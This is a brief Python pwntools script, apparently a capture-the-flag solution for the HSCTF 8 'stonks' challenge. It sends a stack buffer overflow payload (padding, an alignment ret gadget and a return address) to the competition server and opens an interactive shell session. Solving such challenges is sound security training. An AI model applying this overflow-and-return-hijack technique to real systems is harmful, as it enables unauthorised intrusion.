# HSCTF 8
# pwn: stonks
# woanmeo11

from pwn import *

r = remote('stonks.hsc.tf', 1337)
# using extra ret instruction due to stack alignment
# payload = dummy + extra ret instruction + return addr
payload = b'a'*40 + p64(0x4012c2) + p64(0x401258)
r.sendline(payload)

r.interactive()
